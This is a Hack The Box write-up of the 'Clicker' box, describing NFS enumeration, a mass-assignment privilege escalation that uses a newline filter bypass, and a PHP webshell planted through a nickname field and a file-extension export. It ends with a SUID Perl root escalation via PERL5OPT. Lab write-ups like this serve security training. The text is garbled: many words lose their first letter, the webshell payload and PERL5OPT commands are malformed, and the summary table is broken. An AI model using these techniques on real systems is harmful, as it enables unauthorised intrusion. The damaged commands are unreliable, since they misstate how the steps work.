---
description: >-
  Difficulty: Medium OS: Linux Attack Types: NFS Enumeration · PHP Mass
  Assignment · Webshell via File Extension Bypass · SUID Binary Abuse
---

# Clicker

Overview

Clicker is a medium Linux box built around a PHP click-counter game. The attack path goes through NFS enumeration to grab the site's source code, a mass assignment bug in the game's save endpoint to escalate our role to Admin, then a file extension bypass to drop a webshell. Once we have a shell, we abuse a SUID Perl binary with an unsafe environment variable to escalate to root.

## Enumeration

### Nmap Scan

Target IP: 10.10.11.232

`nmap -sV -T4 -O -F --version-light 10.10.11.232`

![Nmap Quick Scan](<../../.gitbook/assets/Unknown image (275)>)

**Open Ports:**

| Port | Service       | Version              |
| ---- | ------------- | -------------------- |
| 22   | SSH           | OpenSSH 8.9p1 Ubuntu |
| 80   | HTTP          | Apache 2.4.52        |
| 111  | rpcbind       | —                    |
| 2049 | rpcbind / NFS | —                    |

Ports 111 and 2049 mean **NFS is running** — that's a big deal and worth checking immediately.

### NFS Enumeration

Running a full nmap scan confirms NFS is exposed:

![Full Nmap Showing NFS on 2049](<../../.gitbook/assets/Unknown image (276)>)

Let's check what shares are exported:

`ash showmount -e 10.10.11.232`

There's a /mnt/backups share. Let's mount it:

`ash sudo mkdir /mnt/clicker_nfs sudo mount -t nfs 10.10.11.232:/mnt/backups /mnt/clicker_nfs/ ls /mnt/clicker_nfs`

![Mounting NFS Share — clicker.htb\_backup.zip found](<../../.gitbook/assets/Unknown image (277)>)

Found **clicker.htb\_backup.zip** — this is the entire website source code. We can't copy it directly (permission denied), but we can unzip it in place:

`ash sudo unzip clicker.htb_backup.zip`

![Unzipping Backup — Source Code Revealed](<../../.gitbook/assets/Unknown image (278)>)

Now we have the full PHP source. Key files include save\_game.php, export.php, dmin.php, and uthenticate.php.

### Web Application

Added clicker.htb to /etc/hosts and visited the site.

![Clicker.htb — The Game Homepage](<../../.gitbook/assets/Unknown image (279)>)

It's a click-counter game. Register an account, log in, and you can click to rack up points.

![Game Play Page — Clicks and Levels](<../../.gitbook/assets/Unknown image (280)>)

The key endpoint here is **/save\_game.php** — it saves your click count and level. After reviewing the source code, it takes clicks, level, and any other GET params and saves them directly into the database with no filtering.

## Initial Access

### Mass Assignment — Injecting the

ole Parameter

Looking at save\_game.php in the source, it loops over all GET parameters and sets them in the database. This means we can inject a \*\* ole=Admin\*\* parameter alongside our normal click save.

Let's intercept the save request in Burp and modify it:

`GET /save_game.php?clicks=113&level=0&role%0a=Admin HTTP/1.1`

> **Note:** The %0a (newline) is added after ole to bypass the blacklist check that blocks the exact string ole.

![Burp — Injecting role=Admin into Save Request (Blocked First Attempt)](<../../.gitbook/assets/Unknown image (281)>)

The first attempt with ole=Admin directly returns a redirect to index.php?err=Malicious activity detected! — it's being filtered. But adding %0a (a newline character) right after the word ole confuses the filter while MySQL still accepts it as the column name.

![Burp — Game Saved Successfully After Bypass](<../../.gitbook/assets/Unknown image (282)>)

After the bypass, the response is Game has been saved!. Now refresh the page — we have **Administration** in the nav bar!

![Logged in as Admin — Administration Panel Visible](<../../.gitbook/assets/Unknown image (283)>)

### Webshell via File Extension Bypass

Inside the admin panel, there's an **Export** feature that exports the top players list to a file. The export request goes to export.php with a hreshold and an extension parameter.

`POST /export.php threshold=1000000&extension=txt`

![Burp — Export Request with extension=txt](<../../.gitbook/assets/Unknown image (284)>)

The exported file is placed in /exports/ with a random filename + our chosen extension. If we change extension=php, the server saves it as a PHP file — and since the export includes user-controlled data (the nickname), we can inject PHP code there.

**Step 1:** Change your nickname to a PHP webshell payload via the profile page:

`<%3fphp+system(['cmd'])%3b%3f>`

**Step 2:** Intercept the save request, inject the PHP webshell as the ickname:

![Burp — Injecting PHP Webshell as Nickname in save\_game.php](<../../.gitbook/assets/Unknown image (285)>)

**Step 3:** Trigger the export with extension=php:

The exported file gets saved to something like /exports/top\_players\_abc123.php.

**Step 4:** Access it with a command:

`http://clicker.htb/exports/top_players_ml50cur6.php?cmd=id`

![RCE — id Command Output via Webshell in Exported PHP File](<../../.gitbook/assets/Unknown image (286)>)

We get code execution as www-data. The Nickname column in the exported table renders our PHP payload.

![Admin Portal — Export with Random Filename](<../../.gitbook/assets/Unknown image (287)>) ![Exported .php File Accessible in Browser](<../../.gitbook/assets/Unknown image (288)>)

## Privilege Escalation

### SUID Binary — Perl with PERL5OPT

Once you have a reverse shell, enumerate SUID binaries:

`find / -perm -4000 2>/dev/null`

You'll find a custom SUID binary. It calls Perl internally without sanitising the environment. The PERL5OPT environment variable lets you inject Perl options — including -M to load a module. We can abuse this:

`export PERL5OPT=-Mbase;print(id)`

Or more practically, set it to execute a command as root:

`PERL5OPT='-Mbase' PERL5LIB=/tmp ./suid_binary`

This gives us a root shell, and we can read /root/root.txt.

## Summary

| Step                             | Detail                                                         |
| -------------------------------- | -------------------------------------------------------------- |
| Recon                            | Nmap → NFS on port 2049                                        |
| NFS                              | Mounted /mnt/backups, got full PHP source code                 |
| Web                              | PHP click game at clicker.htb                                  |
| Mass Assignment                  | Injected                                                       |
| ole%0a=Admin into save\_game.php |                                                                |
| Webshell                         | Exported top-players list as .php with PHP payload as nickname |
| RCE                              | Webshell executed commands as www-data                         |
| Privesc                          | SUID Perl binary abused via PERL5OPT environment variable      |

## Key Takeaways

* **Always check for NFS** when ports 111/2049 are open — exposed shares often leak source code
* **Mass assignment** happens when apps blindly save all request params — always audit save\_game.php-style endpoints
* **File extension controls** must be enforced server-side — client-supplied extensions are dangerous
* **SUID binaries** that invoke interpreters (Perl, Python, etc.) are often exploitable via env vars like PERL5OPT

_Platform: Hack The Box_
